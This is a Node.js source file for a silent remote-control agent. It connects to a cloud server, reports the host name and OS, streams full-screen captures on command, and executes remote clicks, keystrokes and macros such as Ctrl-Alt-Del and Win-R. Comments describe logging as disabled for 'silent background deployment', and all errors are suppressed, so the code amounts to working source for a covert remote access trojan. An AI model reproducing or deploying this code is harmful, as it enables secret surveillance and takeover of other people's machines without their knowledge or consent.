const io = require('socket.io-client');
const robot = require('@jitsi/robotjs');
const jpeg = require('jpeg-js');
const os = require('os');

const systemHostName = os.hostname();
const platformType = os.type() === 'Windows_NT' ? 'Windows' : os.type();
const nativeScreenSize = robot.getScreenSize();

// Explicitly pointed to your new verified control production server
const CLOUD_SERVER_URL = "https://onrender.com"; 

// Console logging suspended for absolute silent background deployment
// console.log(`⚡ Initializing premium agent core engine on machine [${systemHostName}]`);

const socket = io(CLOUD_SERVER_URL, {
    query: { 
        role: 'host',
        deviceName: systemHostName,
        platformOS: platformType
    },
    reconnectionAttempts: 30,
    reconnectionDelay: 4000
});

let streamingIntervalId = null;
let isProcessingFrame = false;

socket.on('connect', () => {
    // console.log("✅ Outbound tunnel successfully bound to central cloud core layer registry.");
});

function captureAndEmitFrame() {
    if (isProcessingFrame || !socket.connected) return;
    isProcessingFrame = true;

    try {
        const img = robot.screen.capture(0, 0, nativeScreenSize.width, nativeScreenSize.height);
        const rawBuffer = Buffer.alloc(img.width * img.height * 4);
        let offset = 0;

        for (let i = 0; i < img.image.length; i += 4) {
            rawBuffer[offset]     = img.image[i + 2]; // R
            rawBuffer[offset + 1] = img.image[i + 1]; // G
            rawBuffer[offset + 2] = img.image[i];     // B
            rawBuffer[offset + 3] = 255;             // A
            offset += 4;
        }

        const compressed = jpeg.encode({ data: rawBuffer, width: img.width, height: img.height }, 75);
        socket.emit('screen-data-stream', compressed.data.toString('base64'));
    } catch (err) {
        // Suppressed silent context monitoring profiles
        // console.error("❌ High-clarity memory frame acquisition failure:", err.message);
    } finally {
        isProcessingFrame = false;
    }
}

// Bandwidth optimization: Server tells agent when to capture video streams
socket.on('start-capture-stream', () => {
    if (streamingIntervalId) return;
    // console.log("👁️ Admin connection registered. Launching screen video stream pipeline...");
    streamingIntervalId = setInterval(captureAndEmitFrame, 110); // Clear high-speed frame loop rate
});

socket.on('stop-capture-stream', () => {
    if (streamingIntervalId) {
        clearInterval(streamingIntervalId);
        streamingIntervalId = null;
        // console.log("🛑 Admin disconnected. Suspending screenshot loop engine to conserve local CPU resources.");
    }
});

socket.on('trigger-single-frame', () => {
    // console.log("⚡ Single manual frame refresh signal triggered.");
    captureAndEmitFrame();
});

// Admin Control Macro execution commands listener pipeline matrix
socket.on('execute-macro', (macro) => {
    // console.log(`⌨️ Processing tool macro instructions payload: ${macro}`);
    try {
        if (macro === 'ctrl-alt-del') {
            robot.keyToggle('control', 'down');
            robot.keyToggle('alt', 'down');
            robot.keyTap('delete');
            robot.keyToggle('control', 'up');
            robot.keyToggle('alt', 'up');
        } else if (macro === 'win-r') {
            // FIXED: Swapped 'command' to 'win' to prevent keyboard mapping parsing errors on Windows
            robot.keyToggle('win', 'down');
            robot.keyTap('r');
            robot.keyToggle('win', 'up');
        }
    } catch (err) {
        // Suppressed
    }
});

socket.on('execute-click', (data) => {
    try {
        if (data && data.x >= 0 && data.x <= nativeScreenSize.width && data.y >= 0 && data.y <= nativeScreenSize.height) {
            robot.moveMouse(data.x, data.y);
            robot.mouseClick();
        }
    } catch (err) {
        // Suppressed
    }
});

socket.on('execute-type', (data) => {
    try {
        if (data && data.key) {
            if (data.modifier) {
                robot.keyToggle(data.modifier, 'down');
                robot.keyTap(data.key);
                robot.keyToggle(data.modifier, 'up');
            } else {
                robot.keyTap(data.key);
            }
        }
    } catch (err) {
        // Suppressed
    }
});

socket.on('disconnect', () => {
    if (streamingIntervalId) {
        clearInterval(streamingIntervalId);
        streamingIntervalId = null;
    }
    // console.log("⚠️ Connection broken with remote cloud cluster registry. Initializing retry routine loops...");
});
